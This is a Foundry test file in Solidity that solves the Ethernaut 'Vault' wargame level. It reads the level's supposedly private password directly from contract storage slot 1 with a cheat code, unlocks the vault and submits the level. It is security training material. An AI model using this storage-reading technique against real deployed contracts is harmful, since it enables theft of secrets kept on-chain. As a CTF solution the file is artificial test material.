pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/08-Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Vault level = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Cheat code to load contract storage at specific slot
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));

        // Call the unlock function with the password we read from storage
        level.unlock(password);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}